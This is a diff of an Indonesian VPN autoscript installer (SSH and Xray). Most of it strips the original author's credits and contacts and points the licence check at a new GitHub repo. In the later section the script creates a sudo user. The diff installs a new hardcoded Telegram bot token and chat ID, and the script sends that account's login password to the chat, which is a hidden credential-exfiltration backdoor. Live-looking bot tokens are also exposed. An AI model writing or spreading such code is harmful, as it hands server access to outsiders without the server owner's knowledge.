@@ -5,19 +5,16 @@ akuu="\033[33m"  #yello
 
 clear
 echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━
-🔔 INFORMATION AUTHOR SCRIP🔔
+🔔 INFORMATION SCRIFT 🔔
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 
-┌────• INFO AUTHOR SC •────┐
-│⏰ 📢 AUTHOR       : MyridTunnel
+┌────•   INFO SCRIFT   •────┐
 │🆓 ✅ RECODE     : ALL-SC
 │👑 ✅ DESCRIPTION : SSH & XRAY
-│👑 ✅ TELEGRAM : T.me/kytxz
-│👑 ✅ WHATSAPP : 081774970898
 └───────────────────────┘
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━
-  🔰 JANGAN LUPA SHALAT ! 🔰
+  🔰 JANGAN LUPA YANG FREE JUGA BAGUS! 🔰
 ━━━━━━━━━━━━━━━━━━━━━━━━━"
 sleep 3
 
@@ -44,7 +41,7 @@ function LOGO() {
  ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
  ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
  ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
-    │    ${YELLOW}Copyright${FONT} (C)$GRAY https://github.com/kytxz$NC     │
+    │    ${YELLOW}Copyright${FONT} (C)$GRAY https://github.com/Gabellz$NC     │
     └───────────────────────────────────────────────┘
          ${RED}Autoscript xray vpn lite (multi port)${FONT}    
 ${RED}Make sure the internet is smooth when installing the script${FONT}
@@ -62,10 +59,7 @@ clear;clear;clear
 
   # // Banner
 echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
-echo -e "  Welcome To MyridTunnel Project Script Manager ${BLUE}(${NC}${BLUE} Last Update Edition ${NC}${BLUE})${NC}"
-echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${BLUE}MYRID ${NC}${BLUE}(${NC} ${BLUE} MyridTunnel Project ${NC}${BLUE})${NC}"
-echo -e "       © Recode By MyridTunnel Project ${BLUE}(${NC} 2023 ${BLUE})${NC}"
+echo -e "  Welcome To Project Script Manager Free ${BLUE}(${NC}${BLUE} Last Update Edition ${NC}${BLUE})${NC}"
 echo -e "${RED}◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇${NC}"
 echo ""
 sleep 3
@@ -73,7 +67,7 @@ sleep 3
 ipsaya=$(wget -qO- ipinfo.io/ip)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip"
+data_ip="https://raw.githubusercontent.com/Gabellz/izin/main/ip"
 #data_ip="https://abc.xcodehoster.com/izin"
 checking_sc() {
   useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
@@ -88,8 +82,7 @@ checking_sc() {
     echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
     echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
     echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      \033[0;36mTelegram${NC} t.me/kytxz"
-    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6281774970898"
+    echo -e "      \033[0;36mBot Acces Scrift${NC} t.me/@VpnTunnellBot"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
     exit
   fi
@@ -155,10 +148,10 @@ clear
 #########################
 # USERNAME
 rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $MYIP | awk '{print $2}')
+username=$(curl https://raw.githubusercontent.com/Gabellz/izin/main/ip | grep $MYIP | awk '{print $2}')
 #username=$(curl https://abc.xcodehoster.com/izin | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $MYIP | awk '{print $3}')
+expx=$(curl https://raw.githubusercontent.com/Gabellz/izin/main/ip | grep $MYIP | awk '{print $3}')
 $expx=$(curl https://abc.xcodehoster.com/izin | grep $MYIP | awk '{print $3}')
 echo "$expx" >/usr/bin/e
 # DETAIL ORDER
@@ -183,7 +176,7 @@ mai="datediff "$Exp" "$DATE""
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $MYIP | awk '{print $4}')
+Exp1=$(curl https://raw.githubusercontent.com/Gabellz/izin/main/ip | grep $MYIP | awk '{print $4}')
 #Exp1=$(curl https://abc.xcodehoster.com/izin | grep $MYIP | awk '{print $4}')
 if [[ $today < $Exp1 ]]; then
 sts="${Info}"
@@ -1052,8 +1045,8 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="6050202923"
-    KEY="6094210408:AAHx2ZMJ8PbcR4SjKvH1n-qDEGm0HoiAIWY"
+    CHATID="-1002050883439"
+    KEY="6450460067:AAHPpi4TvUEsKQ6xSERLbUuSPbX5x0MuVeQ"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
@@ -1065,8 +1058,6 @@ domain=$(cat /etc/xray/domain)
     <code>Pass Login :</code> <code>$Password</code>
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
-    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
-    ⚠︎𝘽𝙮 STVPN 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
     ◇━━━━━━━━━━━━━━━━━━━━━━━◇
 "
 
@@ -1104,7 +1095,7 @@ echo "    Arch       : $Arch" | tee -a log-install.txt
 echo "    Ram Total   : $Ram_Total MB" | tee -a log-install.txt
 echo "    Ram Used   : $Ram_Usage MB" | tee -a log-install.txt
 echo "    ============================" | tee -a log-install.txt
-echo "  ⚠︎𝘽𝙮 STVPN 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎" | tee -a log-install.txt
+echo "  𝗦𝘂𝗰𝗰𝗲𝘀" | tee -a log-install.txt
 echo "    ============================" | tee -a log-install.txt
 echo ""
 echo "SIMPAN DATA VPS DI ATAS" | tee -a log-install.txt
